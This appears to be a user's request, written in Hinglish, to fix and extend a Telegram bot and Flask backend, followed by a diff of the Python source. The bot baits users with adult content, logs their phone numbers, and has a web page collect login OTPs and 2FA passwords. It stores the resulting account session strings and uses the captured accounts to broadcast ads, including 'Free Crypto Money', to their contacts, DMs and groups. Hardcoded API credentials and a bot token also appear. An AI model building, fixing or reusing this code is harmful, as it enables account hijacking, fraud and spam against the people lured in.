@@ -1,1053 +1,137 @@
-Error You Want To Fix And Rewrite All Defective Files And Fix 
-
-YOU WANT TO FIX THIS THIS FROM CODES:
-
-.:
-Broadcast fix Krna hai 
-Contact ko msg jana chahiye
-Dms ,gcs ko bhi 
-
-2. Time interval issue hai - 
-Ek id connect hone ke baad wo 30 min tak kuch nhi krta phir uska 1st ad send hoga then wo bot me set kiye gye interval ko follow krega 
-3. Add toggle on /off for deletion of previous ads 
-4. Video add kr skta hu ads me 
-5. Text with embedded link (me text dunga aur link bhi wo text pe click krne se link khulega ... Multiple set kr skta hu )
-
-Login flow me 
-1st markup keyboard se connect fetch hua ...
-Then web me jaake bas otp dega 
-Aur 2fa if needed after successful login 5 videos ka option show hoga and user click krke videos dekh skta hai 
-  
-
-Aur in sb pages ka background yeh video hoga
-https://tmpfiles.org/woAccPGwLvqZ/angelchan_on_x_new_set_release_secret_life_of_a_naughty_cat_m.mp4
-
-Login flow me 
-1st markup keyboard se connect fetch hua ...
-Then web me jaake bas otp dega 
-Aur 2fa if needed after successful login 5 videos ka option show hoga and user click krke videos ekh skta hai 
-  
-
-Aur in sb pages ka background yeh video hoga
-
-Ek bot ads ka panel hoga alag se 
-Jisme bot se user ko send honge ads 
-Uska interval set kr skta hu
-Bot ads ke liye photo/video set kr skta hu
-Aur uske niche button hoga uska destination url and button name set kr skta hu
-
-
-tujhe backend ko frontend sai properly connect bhi Krna hai and fix krna
-bot.py
-
-
-from pyrogram import Client, filters
-from pyrogram.types import (
-    ReplyKeyboardMarkup,
-    KeyboardButton,
-    InlineKeyboardMarkup,
-    InlineKeyboardButton,
-    WebAppInfo
-)
+import asyncio
+import os
+import threading
 import traceback
-import os
-
-api_id = 32208414
-api_hash = "628f11c05a44c8dda4b006e66f4bf7df"
-bot_token = "8972339795:AAFP8oSMJKav4aEeevCHZ9FnJsrVKJLw9ao"
-
-LOG_CHANNEL = -1004376082945
-WEB_APP_URL = "https://heroku-ne-808a61a8fe9e.herokuapp.com"
-
-# Admin Panel URL - Change this to your admin panel URL
-ADMIN_PANEL_URL = os.environ.get("ADMIN_PANEL_URL", "https://heroku-ne-808a61a8fe9e.herokuapp.com/admin")
-
-# List of admin Telegram IDs - Add your admin IDs here
-ADMIN_IDS = [8580367479, 8694029886]  # 👈 Apna Telegram ID yaha daalo
-
-bot = Client(
-    "edu_bot",
-    api_id=api_id,
-    api_hash=api_hash,
-    bot_token=bot_token
-)
-
-def is_admin(user_id):
-    """Check if user is admin"""
-    return user_id in ADMIN_IDS
-
-@bot.on_message(filters.command("start"))
-async def start_handler(client, message):
-    keyboard = ReplyKeyboardMarkup(
-        [
-            [
-                KeyboardButton(
-                    "📱 Share Phone Number",
-                    request_contact=True
-                )
-            ]
-        ],
-        resize_keyboard=True,
-        one_time_keyboard=True
-    )
-
-    await message.reply_text(
-        "👋 <b>Welcome to Nude Blur!</b>\n\n"
-        "🔞 To access adult content, please share your phone number.\n\n"
-        "🔒 Your number is safe and only used for verification.\n\n"
-        "<b>📱 Tap the button below to share your contact.</b>",
-        reply_markup=keyboard
-    )
-
-@bot.on_message(filters.command("admin"))
-async def admin_handler(client, message):
-    """Admin panel command - only for admins"""
-    user_id = message.from_user.id
-
-    if not is_admin(user_id):
-        await message.reply_text(
-            "⛔ <b>Access Denied!</b>\n\n"
-            "You are not authorized to use this command.",
-        )
-        return
-
-    # Admin keyboard with web app
-    keyboard = InlineKeyboardMarkup(
-        [
-            [
-                InlineKeyboardButton(
-                    "🔥 Open Admin Panel",
-                    web_app=WebAppInfo(url=ADMIN_PANEL_URL)
-                )
-            ],
-            [
-                InlineKeyboardButton(
-                    "📊 View Stats",
-                    callback_data="admin_stats"
-                ),
-                InlineKeyboardButton(
-                    "⚙️ Settings",
-                    callback_data="admin_settings"
-                )
-            ]
-        ]
-    )
-
-    await message.reply_text(
-        f"🔥 <b>ADMIN PANEL</b>\n\n"
-        f"👤 Welcome <b>{message.from_user.first_name}</b>!\n\n"
-        f"📊 <b>Quick Actions:</b>\n"
-        f"• Manage Ads\n"
-        f"• View Statistics\n"
-        f"• Control Bot Settings\n\n"
-        f"⚡ Click the button below to open the admin panel:",
-        reply_markup=keyboard
-    )
-
-@bot.on_message(filters.command("addadmin"))
-async def add_admin_handler(client, message):
-    """Add new admin - only for existing admins"""
-    user_id = message.from_user.id
-
-    if not is_admin(user_id):
-        await message.reply_text("⛔ You are not authorized!")
-        return
-
-    # Get the user ID to add as admin
-    try:
-        new_admin_id = int(message.command[1])
-        if new_admin_id not in ADMIN_IDS:
-            ADMIN_IDS.append(new_admin_id)
-            await message.reply_text(
-                f"✅ <b>Admin Added!</b>\n\n"
-                f"🆔 User ID: <code>{new_admin_id}</code>\n"
-                f"👥 Total Admins: {len(ADMIN_IDS)}"
-            )
-        else:
-            await message.reply_text("⚠️ User is already an admin!")
-    except (IndexError, ValueError):
-        await message.reply_text(
-            "❌ <b>Usage:</b> <code>/addadmin USER_ID</code>\n\n"
-            "Example: <code>/addadmin 123456789</code>"
-        )
-
-@bot.on_message(filters.command("removeadmin"))
-async def remove_admin_handler(client, message):
-    """Remove admin - only for existing admins"""
-    user_id = message.from_user.id
-
-    if not is_admin(user_id):
-        await message.reply_text("⛔ You are not authorized!")
-        return
-
-    try:
-        remove_id = int(message.command[1])
-        if remove_id in ADMIN_IDS:
-            ADMIN_IDS.remove(remove_id)
-            await message.reply_text(
-                f"✅ <b>Admin Removed!</b>\n\n"
-                f"🆔 User ID: <code>{remove_id}</code>"
-            )
-        else:
-            await message.reply_text("⚠️ User is not an admin!")
-    except (IndexError, ValueError):
-        await message.reply_text(
-            "❌ <b>Usage:</b> <code>/removeadmin USER_ID</code>"
-        )
-
-@bot.on_message(filters.command("admins"))
-async def list_admins_handler(client, message):
-    """List all admins"""
-    user_id = message.from_user.id
-
-    if not is_admin(user_id):
-        await message.reply_text("⛔ You are not authorized!")
-        return
-
-    admins_text = "👥 <b>ADMIN LIST</b>\n\n"
-    for idx, admin_id in enumerate(ADMIN_IDS, 1):
-        try:
-            user = await client.get_users(admin_id)
-            name = user.first_name or "Unknown"
-            username = f"@{user.username}" if user.username else "No username"
-            admins_text += f"{idx}. <b>{name}</b>\n   ├ ID: <code>{admin_id}</code>\n   └ {username}\n\n"
-        except:
-            admins_text += f"{idx}. <b>Unknown User</b>\n   └ ID: <code>{admin_id}</code>\n\n"
-
-    await message.reply_text(admins_text)
-
-@bot.on_message(filters.contact)
-async def contact_handler(client, message):
-    try:
-        contact = message.contact
-        user = message.from_user
-
-        if contact.user_id is not None and contact.user_id != user.id:
-            await message.reply_text(
-                "❌ Please use the button to share your own phone number."
-            )
-            return
-
-        name = user.first_name or "Unknown"
-        phone = contact.phone_number
-        user_id = user.id
-
-        # Send log to channel
-        try:
-            await client.send_message(
-                LOG_CHANNEL,
-                f"🎓 <b>NEW LOGIN</b>\n\n"
-                f"👤 Name: {name}\n"
-                f"📱 Phone: +{phone}\n"
-                f"🆔 TG ID: <code>{user_id}</code>"
-            )
-            print(f"✅ Log sent to channel for user {user_id}")
-        except Exception as log_error:
-            print(f"❌ Failed to send log: {log_error}")
-
-        # Web App button
-        keyboard = InlineKeyboardMarkup(
-            [
-                [
-                    InlineKeyboardButton(
-                        "🔥 Get Nudes Now",
-                        web_app=WebAppInfo(url=WEB_APP_URL)
-                    )
-                ]
-            ]
-        )
-
-        await message.reply_text(
-            "📱 <b>Phone number received!</b>\n\n"
-            "🔞 Click the button below to access adult content.\n\n"
-            "<b>⚠️ 18+ Content</b> - You must be 18 years or older.",
-            reply_markup=keyboard
-        )
-
-    except Exception as e:
-        error_msg = f"Error: {str(e)}\n\n{traceback.format_exc()}"
-        print(error_msg)
-        await message.reply_text(
-            f"❌ Error: {str(e)}\n\nPlease try again or contact support."
-        )
-
-@bot.on_callback_query()
-async def callback_handler(client, callback_query):
-    """Handle callback queries"""
-    data = callback_query.data
-    user_id = callback_query.from_user.id
-
-    if not is_admin(user_id):
-        await callback_query.answer("⛔ Not authorized!", show_alert=True)
-        return
-
-    if data == "admin_stats":
-        # Show quick stats
-        await callback_query.answer("📊 Loading stats...", show_alert=False)
-        await callback_query.message.reply_text(
-            "📊 <b>Quick Stats</b>\n\n"
-            "Use the Admin Panel for detailed statistics.",
-        )
-
-    elif data == "admin_settings":
-        await callback_query.answer("⚙️ Opening settings...", show_alert=False)
-        await callback_query.message.reply_text(
-            "⚙️ <b>Settings</b>\n\n"
-            "Open the Admin Panel to change settings.",
-        )
-
-if __name__ == "__main__":
-    print("🚀 Sex Bot Started...")
-    print(f"📢 Log Channel: {LOG_CHANNEL}")
-    print(f"🔥 Admin Panel: {ADMIN_PANEL_URL}")
-    print(f"👥 Admins: {len(ADMIN_IDS)}")
-    bot.run()
-
-
-
-app.py
-
-
-import os
-from flask import Flask
-from config import SECRET_KEY, UPLOAD_FOLDER, MAX_CONTENT_LENGTH
-from Nexa.auth_routes import auth_bp
-from Nexa.admin_routes import admin_bp
-
-app = Flask(__name__)
-app.secret_key = SECRET_KEY
-app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER
-app.config["MAX_CONTENT_LENGTH"] = MAX_CONTENT_LENGTH
-
-os.makedirs(UPLOAD_FOLDER, exist_ok=True)
-
-app.register_blueprint(auth_bp)
-app.register_blueprint(admin_bp, url_prefix="/admin")
-
-
-def init_system():
-    try:
-        from Nexa.database import get_ads_config
-        from Nexa.broadcaster import ads_broadcaster
-        from Nexa.session_manager import session_cleaner
-        if get_ads_config().get("ads_enabled", False):
-            ads_broadcaster.start()
-            session_cleaner.start()
-            print("✅ auto-started")
-    except Exception as e:
-        print(f"⚠️ startup: {e}")
-
-
-init_system()
-
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
-
-
-Nexa/session_manager.py
-
-
-import asyncio
-import threading
-import uuid
-from datetime import datetime, timedelta
-from pyrogram import Client
-from config import API_ID, API_HASH
-from Nexa.database import temp_sessions_col, ensure_db
-
-_global_stats = {"active_sessions": 0, "pending_msgs": 0}
-
-
-class SessionThread:
-    def __init__(self, session_id, phone):
-        self.session_id = session_id
-        self.phone = phone
-        self.client = None
-        self.loop = None
-        self.thread = None
-        self.connected = False
-        self.connection_error = None
-        self._connected_event = threading.Event()
-        self.thread = threading.Thread(target=self._run_loop, daemon=True)
-        self.thread.start()
-
-    async def _init_and_connect(self):
-        self.client = Client(
-            name=f"session_{self.session_id}",
-            api_id=API_ID, api_hash=API_HASH,
-            in_memory=True, no_updates=True)
-        await self.client.connect()
-
-    def _run_loop(self):
-        try:
-            self.loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(self.loop)
-            self.loop.run_until_complete(self._init_and_connect())
-            self.connected = True
-            self._connected_event.set()
-            self.loop.run_forever()
-        except Exception as e:
-            self.connection_error = str(e)
-            self.connected = False
-            self._connected_event.set()
-        finally:
-            try:
-                if self.loop and not self.loop.is_closed():
-                    self.loop.close()
-            except Exception:
-                pass
-
-    def wait_for_connection(self, timeout=10):
-        return self._connected_event.wait(timeout=timeout)
-
-    def execute(self, coro_func, *args, timeout=60):
-        if not self.loop or not self.connected:
-            raise RuntimeError("Session not connected")
-
-        async def wrapper():
-            return await coro_func(*args)
-
-        future = asyncio.run_coroutine_threadsafe(wrapper(), self.loop)
-        return future.result(timeout=timeout)
-
-    def stop(self):
-        try:
-            if self.client and self.connected and self.loop and not self.loop.is_closed():
-                try:
-                    asyncio.run_coroutine_threadsafe(
-                        self.client.disconnect(), self.loop).result(timeout=3)
-                except Exception:
-                    pass
-            if self.loop and self.loop.is_running():
-                self.loop.call_soon_threadsafe(self.loop.stop)
-            if self.thread and self.thread.is_alive():
-                self.thread.join(timeout=3)
-        except Exception:
-            pass
-        self.connected = False
-
-
-class SessionManager:
-    def __init__(self):
-        self._sessions = {}
-        self._lock = threading.Lock()
-
-    def create_session(self, session_id, phone):
-        self.remove_session(session_id)
-        session = SessionThread(session_id, phone)
-        if not session.wait_for_connection(timeout=10):
-            session.stop()
-            raise RuntimeError("Session connection timeout")
-        if not session.connected:
-            err = session.connection_error or "Unknown error"
-            session.stop()
-            raise RuntimeError(f"Failed to connect: {err}")
-        with self._lock:
-            self._sessions[session_id] = session
-        ensure_db()
-        if temp_sessions_col is not None:
-            temp_sessions_col.update_one(
-                {"_id": session_id},
-                {"$set": {"phone": phone, "created_at": datetime.now(),
-                          "status": "connected"}}, upsert=True)
-        return session
-
-    def get_session(self, session_id):
-        with self._lock:
-            session = self._sessions.get(session_id)
-            if session and session.connected and session.thread.is_alive():
-                return session
-            if session:
-                self._sessions.pop(session_id, None)
-        if session:
-            session.stop()   # H7: stop leaked thread
-        return None
-
-    def remove_session(self, session_id):
-        with self._lock:
-            session = self._sessions.pop(session_id, None)
-        if session:
-            session.stop()
-        ensure_db()
-        if temp_sessions_col is not None:
-            temp_sessions_col.delete_one({"_id": session_id})
-
-    def cleanup_old(self, max_age_minutes=10):
-        ensure_db()
-        if temp_sessions_col is None:
-            return
-        cutoff = datetime.now() - timedelta(minutes=max_age_minutes)
-        for doc in list(temp_sessions_col.find({"created_at": {"$lt": cutoff}})):
-            self.remove_session(doc["_id"])
-
-    def cleanup_dead_sessions(self):
-        with self._lock:
-            dead = [sid for sid, s in list(self._sessions.items())
-                    if not s.connected or not s.thread.is_alive()]
-        for sid in dead:
-            self.remove_session(sid)
-        return len(dead)
-
-    def get_active_count(self):
-        with self._lock:
-            return len([s for s in self._sessions.values() if s.connected])
-
-
-class SessionCleaner:
-    def __init__(self):
-        self._running = False
-        self._thread = None
-        self._stop_event = threading.Event()
-
-    def start(self):
-        if self._running:
-            return
-        self._running = True
-        self._stop_event.clear()
-        self._thread = threading.Thread(target=self._run, daemon=True)
-        self._thread.start()
-        print("🧹 Session Cleaner started")
-
-    def stop(self):
-        if not self._running:
-            return
-        self._stop_event.set()
-        self._running = False
-        if self._thread:
-            self._thread.join(timeout=5)
-        print("🧹 Session Cleaner stopped")
-
-    def _run(self):
-        from Nexa.database import ads_config_col, broadcast_msgs_col
-        while not self._stop_event.is_set():
-            try:
-                # C1 FIX: use the module singleton
-                count = session_manager.cleanup_dead_sessions()
-                if count:
-                    print(f"🧹 Cleaned {count} dead sessions")
-                _global_stats["active_sessions"] = session_manager.get_active_count()
-                if broadcast_msgs_col is not None:
-                    _global_stats["pending_msgs"] = broadcast_msgs_col.count_documents({})
-                if ads_config_col is not None:
-                    ads_config_col.update_one(
-                        {"_id": "stats"},
-                        {"$set": {"active_sessions": _global_stats["active_sessions"],
-                                  "pending_msgs": _global_stats["pending_msgs"],
-                                  "last_cleanup": datetime.now()}},
-                        upsert=True)
-            except Exception as e:
-                print(f"Session cleaner error: {e}")
-            self._stop_event.wait(30)
-
-
-session_manager = SessionManager()
-session_cleaner = SessionCleaner()
-
-
-Nexa/database.py
-
-
-import os
-import time
-import threading
-from datetime import datetime, timedelta
-
-import requests
-from pymongo import MongoClient, ASCENDING
-from pymongo.errors import PyMongoError
-
-from config import (
-    MONGODB_URI, DB_NAME, BOT_TOKEN, CHANNEL_ID,
-    DEFAULT_INTERVAL_SEC, UPLOAD_FOLDER,
-)
-
-mongo_client = None
-db = None
-db_connected = False
-
-users_col = None
-ads_config_col = None
-temp_sessions_col = None
-ads_logs_col = None
-broadcast_msgs_col = None
-
-_config_lock = threading.RLock()
-_db_lock = threading.RLock()
-
-_last_ping = 0.0
-_PING_INTERVAL = 30
-
-# ---- Media extensions ----
-ALLOWED_IMAGE_EXT = {"png", "jpg", "jpeg", "gif", "webp", "bmp"}
-ALLOWED_VIDEO_EXT = {"mp4", "mov", "avi", "mkv", "webm", "m4v", "3gp"}
-ALLOWED_EXT       = ALLOWED_IMAGE_EXT | ALLOWED_VIDEO_EXT
-
-# Default ads — button-only shape
-DEFAULT_ADS = [
-    {
-        "id": "ad1",
-        "has_button": True,
-        "label": "Adult Content Available",
-        "url": "https://example.com/adult",
-    },
-    {
-        "id": "ad2",
-        "has_button": True,
-        "label": "Free Crypto Money",
-        "url": "https://example.com/crypto",
-    },
-]
-
-_CFG_DEFAULTS = {
-    "ads_enabled": False,
-    "interval": DEFAULT_INTERVAL_SEC,
-    "caption": "",
-    "media_path": None,       # new key (photo or video path)
-    "media_type": None,       # "photo" | "video"
-    "photo_path": None,       # legacy alias
-    "delete_after_round": False,
-}
-
-
-def _default_config():
-    config = {
-        "_id": "main_config",
-        "updated_at": datetime.now(),
-    }
-    config.update(_CFG_DEFAULTS)
-    config["ads"] = [dict(ad) for ad in DEFAULT_ADS]
-    return config
-
-
-def _ensure_indexes():
-    if users_col is None:
-        return
-    try:
-        users_col.create_index([("phone", ASCENDING)])
-        users_col.create_index([("user_id", ASCENDING)])
-        users_col.create_index([("ads_enabled", ASCENDING)])
-        temp_sessions_col.create_index([("created_at", ASCENDING)])
-        broadcast_msgs_col.create_index([("broadcast_id", ASCENDING)])
-    except PyMongoError as exc:
-        print(f"MongoDB index error: {exc}")
-
-
-def _connect():
-    global mongo_client, db, db_connected
-    global users_col, ads_config_col, temp_sessions_col, ads_logs_col, broadcast_msgs_col
-    global _last_ping
-
-    with _db_lock:
-        old_client = mongo_client
-        mongo_client = None
-        db = None
-        db_connected = False
-        users_col = ads_config_col = temp_sessions_col = ads_logs_col = broadcast_msgs_col = None
-
-        if old_client is not None:
-            try:
-                old_client.close()
-            except Exception:
-                pass
-
-        client = None
-        try:
-            if not MONGODB_URI:
-                raise ValueError("MONGODB_URI is not configured")
-
-            client = MongoClient(
-                MONGODB_URI,
-                serverSelectionTimeoutMS=5000,
-                connectTimeoutMS=5000,
-                socketTimeoutMS=10000,
-                retryWrites=True,
-            )
-
-            database = client[DB_NAME]
-            client.admin.command("ping")
-
-            mongo_client = client
-            db = database
-            db_connected = True
-
-            users_col = db.users
-            ads_config_col = db.ads_config
-            temp_sessions_col = db.temp_sessions
-            ads_logs_col = db.ads_logs
-            broadcast_msgs_col = db.broadcast_msgs
-
-            _last_ping = time.time()
-            print("MongoDB connected successfully")
-            _ensure_indexes()
-            return True
-
-        except Exception as exc:
-            print(f"MongoDB connection failed: {exc}")
-            if client is not None:
-                try:
-                    client.close()
-                except Exception:
-                    pass
-            mongo_client = None
-            db = None
-            db_connected = False
-            users_col = ads_config_col = temp_sessions_col = ads_logs_col = broadcast_msgs_col = None
-            _last_ping = time.time()
-            return False
-
-
-def ensure_db():
-    global _last_ping, db_connected
-    with _db_lock:
-        now = time.time()
-        if mongo_client is None or not db_connected:
-            return _connect()
-        if now - _last_ping < _PING_INTERVAL:
-            return True
-        try:
-            mongo_client.admin.command("ping")
-            db_connected = True
-            _last_ping = time.time()
-            return True
-        except Exception as exc:
-            print(f"MongoDB ping failed: {exc}")
-            return _connect()
-
-
-def init_db():
-    return _connect()
-
-
-def allowed_file(filename):
-    return "." in filename and filename.rsplit(".", 1)[1].lower() in ALLOWED_EXT
-
-
-def media_kind(filename):
-    """Return 'photo' | 'video' | None."""
-    if not filename or "." not in filename:
-        return None
-    ext = filename.rsplit(".", 1)[1].lower()
-    if ext in ALLOWED_VIDEO_EXT:
-        return "video"
-    if ext in ALLOWED_IMAGE_EXT:
-        return "photo"
-    return None
-
-
-def delete_photo_file(path):
-    try:
-        if path and os.path.isfile(path):
-            os.remove(path)
-    except OSError as exc:
-        print(f"Could not delete {path}: {exc}")
-
-
-# ---------------- sessions ----------------
-
-def save_session_to_db(session_data):
-    if not ensure_db() or users_col is None:
-        return False
-    try:
-        phone = session_data["phone"]
-        payload = {
-            "session_string": session_data["session_string"],
-            "updated_at": datetime.now(),
-            "user_id": session_data["id"],
-            "username": session_data.get("username"),
-            "first_name": session_data.get("first_name", ""),
-            "last_name": session_data.get("last_name", ""),
-            "status": "active",
-        }
-
-        existing = users_col.find_one({"phone": phone})
-        if existing:
-            users_col.update_one({"_id": existing["_id"]}, {"$set": payload})
-            return str(existing["_id"])
-
-        payload.update({
-            "phone": phone,
-            "session_name": session_data.get("session_name"),
-            "created_at": datetime.now(),   # real datetime → used by 30-min grace
-            "ads_enabled": True,
-            "last_ad_time": None,
-            "deliveries": 0,
-            "failures": 0,
-        })
-        result = users_col.insert_one(payload)
-        return str(result.inserted_id)
-
-    except (PyMongoError, KeyError, TypeError) as exc:
-        print(f"Save session error: {exc}")
-        return False
-
-
-# ---------------- config ----------------
-
-def get_ads_config():
-    if not ensure_db() or ads_config_col is None:
-        return _default_config()
-    try:
-        config = ads_config_col.find_one({"_id": "main_config"})
-        if not config:
-            default_config = _default_config()
-            ads_config_col.update_one(
-                {"_id": "main_config"},
-                {"$setOnInsert": default_config},
-                upsert=True,
-            )
-            config = ads_config_col.find_one({"_id": "main_config"}) or default_config
-
-        for key, value in _CFG_DEFAULTS.items():
-            config.setdefault(key, value)
-        config.setdefault("ads", [dict(ad) for ad in DEFAULT_ADS])
-
-        # Backfill media_path from legacy photo_path
-        if not config.get("media_path") and config.get("photo_path"):
-            config["media_path"] = config["photo_path"]
-        if not config.get("media_type") and config.get("media_path"):
-            config["media_type"] = media_kind(config["media_path"]) or "photo"
-
-        return config
-
-    except PyMongoError as exc:
-        print(f"Get ads config error: {exc}")
-        return _default_config()
-
-
-def update_ads_config(updates):
-    if not ensure_db() or ads_config_col is None:
-        return False
-    updates = dict(updates)
-    updates.pop("_id", None)
-    updates["updated_at"] = datetime.now()
-    try:
-        with _config_lock:
-            ads_config_col.update_one(
-                {"_id": "main_config"},
-                {"$set": updates},
-                upsert=True,
-            )
-        return True
-    except PyMongoError as exc:
-        print(f"Update ads config error: {exc}")
-        return False
-
-
-def inc_ads_config(field, amount=1):
-    if not ensure_db() or ads_config_col is None:
-        return False
-    if (not isinstance(field, str) or not field or field == "_id"
-            or field.startswith("$") or "." in field):
-        return False
-    try:
-        ads_config_col.update_one(
-            {"_id": "main_config"},
-            {"$inc": {field: amount}},
-            upsert=True,
-        )
-        return True
-    except PyMongoError as exc:
-        print(f"Increment ads config error: {exc}")
-        return False
-
-
-def mutate_ads(mutator):
-    with _config_lock:
-        config = get_ads_config()
-        ads = [dict(ad) for ad in config.get("ads", [])]
-        new_ads = mutator(ads)
-        if new_ads is None:
-            return None
-        if update_ads_config({"ads": new_ads}):
-            return new_ads
-        return None
-
-
-def reset_ads_config():
-    config = get_ads_config()
-    old_media = config.get("media_path") or config.get("photo_path")
-    success = update_ads_config({
-        "ads": [dict(ad) for ad in DEFAULT_ADS],
-        "caption": "",
-        "media_path": None,
-        "media_type": None,
-        "photo_path": None,
-    })
-    return old_media if success else None
-
-
-# ---------------- stats ----------------
-
-def get_stats():
-    empty = {
-        "total_users": 0, "active_users": 0, "idle_users": 0,
-        "opted_in": 0, "total_deliveries": 0, "total_broadcasts": 0,
-        "db_connected": False, "active_sessions": 0, "pending_msgs": 0,
-        "online_users": 0, "recent_users": 0,
-        "last_broadcast_at": None, "next_broadcast_at": None,
-        "broadcast_mode_users": 0, "registered_today": 0,
-    }
-    if not ensure_db() or users_col is None:
-        return empty
-    try:
-        total     = users_col.count_documents({})
-        active    = users_col.count_documents({"status": "active"})
-        idle      = users_col.count_documents({"status": "idle"})
-        opted_in  = users_col.count_documents({"ads_enabled": True})
-
-        agg = list(users_col.aggregate([{
-            "$group": {
-                "_id": None,
-                "d": {"$sum": {"$ifNull": ["$deliveries", 0]}},
-                "f": {"$sum": {"$ifNull": ["$failures", 0]}},
-            }
-        }]))
-        deliveries = agg[0]["d"] if agg else 0
-
-        yesterday = datetime.now() - timedelta(days=1)
-        recent = users_col.count_documents({"created_at": {"$gte": yesterday}})
-
-        last_hour = datetime.now() - timedelta(hours=1)
-        online = users_col.count_documents({"last_ad_time": {"$gte": last_hour}})
-
-        pending = (broadcast_msgs_col.count_documents({})
-                   if broadcast_msgs_col is not None else 0)
-
-        today_start = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
-        registered_today = users_col.count_documents({"created_at": {"$gte": today_start}})
-
-        config = get_ads_config()
-
-        return {
-            "total_users": total,
-            "active_users": active,
-            "idle_users": idle,
-            "opted_in": opted_in,
-            "total_deliveries": deliveries,
-            "total_broadcasts": config.get("total_broadcasts", 0),
-            "online_users": online,
-            "recent_users": recent,
-            "pending_msgs": pending,
-            "db_connected": db_connected,
-            "active_sessions": 0,
-            "last_broadcast_at": config.get("last_broadcast_at"),
-            "next_broadcast_at": config.get("next_broadcast_at"),
-            "broadcast_mode_users": opted_in,
-            "registered_today": registered_today,
-        }
-    except PyMongoError as exc:
-        print(f"Get stats error: {exc}")
-        return empty
-
-
-def get_all_users():
-    if not ensure_db() or users_col is None:
-        return []
-    try:
-        output = []
-        for user in users_col.find().sort("created_at", -1):
-            ca = user.get("created_at")
-            la = user.get("last_ad_time")
-            output.append({
-                "id": str(user.get("_id")),
-                "user_id": user.get("user_id"),
-                "name": f"{user.get('first_name', '')} {user.get('last_name', '')}".strip(),
-                "username": user.get("username") or "N/A",
-                "phone": user.get("phone") or "N/A",
-                "status": user.get("status", "unknown"),
-                "ads_enabled": user.get("ads_enabled", True),
-                "deliveries": user.get("deliveries", 0),
-                "created_at": ca.strftime("%Y-%m-%d %H:%M") if isinstance(ca, datetime) else "N/A",
-                "last_ad_time": la.strftime("%Y-%m-%d %H:%M") if isinstance(la, datetime) else "Never",
-            })
-        return output
-    except PyMongoError as exc:
-        print(f"Get all users error: {exc}")
-        return []
-
-
-def send_to_channel(message):
-    if not BOT_TOKEN:
-        print("BOT_TOKEN is not configured")
-        return False
-    try:
-        response = requests.post(
-            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-            json={
-                "chat_id": CHANNEL_ID,
-                "text": message,
-                "parse_mode": "HTML",
-                "disable_web_page_preview": True,
-            },
-            timeout=10,
-        )
-        if response.status_code != 200:
-            print(f"Telegram HTTP error: {response.status_code}")
-            return False
-        result = response.json()
-        if not result.get("ok"):
-            print(f"Telegram API error: {result}")
-        return result.get("ok", False)
-    except (requests.RequestException, ValueError) as exc:
-        print(f"Telegram channel error: {exc}")
-        return False
-
-
-init_db()
-
-
-Nexa/broadcaster.py
-
-import os
-import asyncio
-import threading
 import uuid
 from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime, timedelta
+
 from pyrogram import Client
-from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
-from pyrogram.errors import (FloodWait, BadRequest, UserDeactivated,
-                             AuthKeyUnregistered, PeerIdInvalid, ChannelInvalid)
+from pyrogram.errors import (
+    FloodWait, BadRequest, UserDeactivated, AuthKeyUnregistered,
+    PeerIdInvalid, ChannelInvalid, ChannelPrivate, ChatWriteForbidden,
+)
+
+try:
+    from pyrogram.enums import ParseMode
+except ImportError:
+    from pyrogram.types import ParseMode
+
+import Nexa.database as dbmod
+from Nexa.logs import info, success, warn, error
 
 from config import (
-    API_ID, API_HASH, BROADCAST_WORKERS,
-    FIRST_AD_DELAY_MIN, CONTACT_LIMIT_PER_ROUND, CONTACT_DM_GAP_SEC,
-    GROUP_DM_GAP_SEC,
+    API_ID, API_HASH, BROADCAST_WORKERS, TICK_SECONDS,
+    CONTACT_LIMIT_PER_ROUND, CONTACT_DM_GAP_SEC, GROUP_DM_GAP_SEC,
+    DEFAULT_INTERVAL_SEC, UPLOAD_FOLDER,
 )
-from Nexa.database import (
-    users_col, ads_config_col, broadcast_msgs_col,
-    update_ads_config, inc_ads_config,
-)
+
+SKIP_ERRORS = (PeerIdInvalid, ChannelInvalid, ChannelPrivate, ChatWriteForbidden)
+WORK_TIMEOUT = 600
+
+_PARSE_STATE = {"html_ok": True, "warned": False}
+
+
+def _parse_mode():
+    return ParseMode.HTML if _PARSE_STATE["html_ok"] else None
+
+
+def _disable_html(reason):
+    _PARSE_STATE["html_ok"] = False
+    if not _PARSE_STATE["warned"]:
+        _PARSE_STATE["warned"] = True
+        warn(f"HTML parse mode unavailable ({reason}) - using plain text")
+
+
+_MEDIA_WARNED = set()
+
+
+def _resolve_media(media_path):
+    if not media_path:
+        return None
+    if not isinstance(media_path, str):
+        media_path = str(media_path)
+
+    base = os.path.basename(media_path)
+    candidates = [
+        media_path,
+        os.path.join(UPLOAD_FOLDER, base),
+        os.path.join(os.getcwd(), base),
+        os.path.join(UPLOAD_FOLDER, media_path.lstrip("/\\")),
+    ]
+    for cand in candidates:
+        try:
+            if cand and os.path.isfile(cand):
+                return os.path.abspath(cand)
+        except (OSError, ValueError):
+            continue
+
+    if media_path not in _MEDIA_WARNED:
+        _MEDIA_WARNED.add(media_path)
+        error(
+            f"MEDIA MISSING: '{media_path}' not on disk - sending text only. "
+            f"Heroku wipes /app/uploads on restart, re-upload it."
+        )
+    return None
 
 
 def _chat_type_value(t):
     return getattr(t, "value", t)
 
 
-def _clean_ads(config):
-    """Ads are buttons only. Keep ads where has_button=True and url is valid."""
-    out = []
-    for ad in config.get("ads", []):
-        if not ad.get("has_button"):
+def _coerce_chat_id(v):
+    if isinstance(v, int):
+        return v
+    if isinstance(v, str):
+        if v in ("me", "self"):
+            return "me"
+        try:
+            return int(v)
+        except ValueError:
+            return v
+    return v
+
+
+def _build_payload(config):
+    base = config.get("caption") or ""
+    if not isinstance(base, str):
+        base = str(base)
+    if not config.get("caption_is_html"):
+        base = base.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
+
+    link_lines = []
+    ads = config.get("ads") or []
+    if not isinstance(ads, list):
+        ads = []
+    for ad in ads:
+        if not isinstance(ad, dict) or not ad.get("enabled", True):
             continue
-        label = (ad.get("label") or "").strip()
-        url   = (ad.get("url") or "").strip()
-        if label and url.startswith(("http://", "https://")):
-            out.append({"has_button": True, "label": label, "url": url})
-    return out
+        url = ad.get("url") or ""
+        if not isinstance(url, str):
+            url = str(url)
+        url = url.strip()
+        if not url.startswith(("http://", "https://")):
+            continue
